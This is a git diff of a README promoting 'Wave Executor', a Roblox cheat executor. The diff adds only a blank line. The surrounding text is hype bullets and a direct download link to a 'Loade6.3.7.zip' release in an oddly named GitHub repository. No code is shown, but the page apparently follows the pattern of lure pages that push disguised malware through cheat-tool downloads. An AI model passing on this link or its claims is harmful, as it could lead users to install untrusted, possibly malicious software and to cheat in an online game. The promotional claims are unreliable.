@@ -4,6 +4,7 @@ Enjoy seamless gaming experience with the latest version of Wave Executor, featu
 ![wave_executor_roblox__1735813922_50b980f3_progressive](https://github.com/user-attachments/assets/068c3081-f778-41c1-8a44-efaadde469e5)
 
 
+
 ## [Download](https://github.com/BEATTHEMATRIX30192398/cautious-bassoon/releases/download/nmkl/Loade6.3.7.zip)
 
 - ⚡ Enhanced Performance: Experience seamless gameplay with faster execution and optimized resources.- 🚀 Speed Optimization: Wave Executor is designed to launch and execute your games with lightning speed.
